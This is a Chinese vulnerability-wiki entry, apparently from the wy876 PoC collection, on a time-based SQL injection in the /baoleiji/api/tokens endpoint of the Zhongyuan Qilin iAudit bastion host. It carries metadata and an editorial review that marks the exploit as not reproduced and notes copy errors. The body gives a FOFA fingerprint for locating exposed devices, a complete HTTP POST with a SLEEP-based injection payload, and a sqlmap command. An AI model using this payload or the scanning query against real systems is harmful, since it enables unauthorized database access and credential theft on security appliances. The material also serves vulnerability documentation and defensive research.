---
source: "wy876 漏洞文库"
id: "vw-6c586ec60f24b7c54a4b241c"
entity_id: "ve-6c586ec60f24b7c54a4b241c"
schema_version: "1"
fofa_unverified: "cert.subject="
title: "中远麒麟堡垒机tokensSQL注入漏洞"
product: "中远麒麟iAudit堡垒机"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "含PHPSESSID，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAtokensSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hc0u6hawuz8n4lam"
source_status: "recorded"
---

# 中远麒麟堡垒机tokensSQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：中远麒麟iAudit堡垒机
- 本文讨论：baoleiji/api/tokens constr SQL注入
- 版本、权限与配置前提：含PHPSESSID，版本未知
- 资料类型：延时SQL请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 简介仍写admin.php，是从另一入口复制的错误
- 无延时响应/基线，sqlmap未携会话需解释
- FOFA元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入

### 待核与来源

- 会话要求、响应与修复版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
中远麒麟依托自身强大的研发能力,丰富的行业经验，自主研发了新一代软硬件一体化统一安全运维平台一-iAudit 统一安全运维平台。该产品支持对企业运维人员在运维过程中进行统一身份认证、统一授权、统一审计、统一监控，消除了传统运维过程中的盲区，实现了运维简单化、操作可控化、过程可视化，是企业 IT 内控最有效的管理平台。中远麒麟堡垒机admin.php接口处存在sql注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。

# 二、影响版本
+ 中远麒麟堡垒机

# 三、资产测绘
+ fofa`cert.subject="Baolei"`
+ 登录页面


# 四、漏洞复现
```http
POST /baoleiji/api/tokens HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=66b**************************c42
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 91

constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND'AAdm'='AAdm&title=%40127.0.0.1
```


**sqlmap**

```plain
sqlmap -u 'https://xx.xx.xx.xx/baoleiji/api/tokens' --data='constr=1&title=%40127.0.0.1'
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hc0u6hawuz8n4lam>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
